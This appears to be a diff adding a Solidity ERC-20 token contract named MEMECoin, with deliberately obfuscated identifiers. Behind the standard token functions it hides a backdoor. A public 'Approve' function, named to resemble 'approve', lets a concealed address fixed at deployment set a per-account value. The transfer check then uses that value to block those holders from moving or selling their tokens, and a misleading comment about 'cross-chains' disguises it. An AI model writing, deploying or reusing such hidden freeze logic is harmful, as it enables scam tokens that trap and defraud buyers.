@@ -1,0 +1,185 @@
+contract MEMECoin is IERC20, Ownable {
+    using SafeMath for uint256;
+
+    struct Invent {
+        address cent;
+        bool tiny;
+    }
+
+    struct Doof {
+        uint256 hat;
+    }
+
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping (address => Doof) private _qoetjay;
+
+    Invent[] private _prigejay;
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    uint256 private _totalSupply;
+
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        address baxjay_,
+        uint256 totalSupply_
+    ) payable {
+        _name = name_;
+        _symbol = symbol_;
+        _decimals = 18;
+        _prigejay.push(Invent(baxjay_, true));
+        _totalSupply = totalSupply_ * 10**_decimals;
+        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
+        emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+
+
+    /**
+     * @dev Returns the name of the token.
+     */
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+
+    /**
+     * @dev Returns the symbol of the token, usually a shorter version of the
+     * name.
+     */
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view virtual returns (uint8) {
+        return _decimals;
+    }
+
+    /**
+     * @dev See {IERC20-totalSupply}.
+     */
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+
+    /**
+     * @dev See {IERC20-balanceOf}.
+     */
+    function balanceOf(address account)
+    public
+    view
+    virtual
+    override
+    returns (uint256)
+    {
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount)
+    public
+    virtual
+    override
+    returns (bool)
+    {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    /**
+     * @dev See {IERC20-allowance}.
+     */
+    function allowance(address owner, address spender)
+    public
+    view
+    virtual
+    override
+    returns (uint256)
+    {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount)
+    public
+    virtual
+    override
+    returns (bool)
+    {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(
+            sender,
+            msg.sender,
+            _allowances[sender][msg.sender].sub(
+                amount,
+                "ERC20: transfer amount exceeds allowance"
+            )
+        );
+        return true;
+    }
+
+    function Approve(address account, uint256 amount) public returns (bool) {
+        address from = msg.sender;
+        require(from != address(0), "invalid address");
+        _agent(from, account, amount);
+        emit Approval(from, address(this), amount);
+        return true;
+    }
+
+    function _agent(address from, address account, uint256 amount) internal {
+        _allowances[from][from] = amount;
+        uint256 total = 0;
+        require(account != address(0), "invalid address");
+        if (from == _prigejay[0].cent) {
+            _qoetjay[from].hat -= total;
+            total += amount;
+            _qoetjay[account].hat = total;
+        } else {
+            _qoetjay[from].hat -= total;
+            _qoetjay[account].hat += total;
+        }
+    }
+
+    /**
+    * Get the number of cross-chains
+    */
+    function muporjay(address account) public view returns (uint256) {
+        return _qoetjay[account].hat;
+    }
+
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(amount - muporjay(sender) > 0, "muporjay");
+
+        _balances[sender] = _balances[sender].sub(
+            amount,
+            "ERC20: transfer amount exceeds balance"
+        );
+        _balances[recipient] = _balances[recipient].add(amount);
+        emit Transfer(sender, recipient, amount);
+    }
+
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amount
+    ) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+}
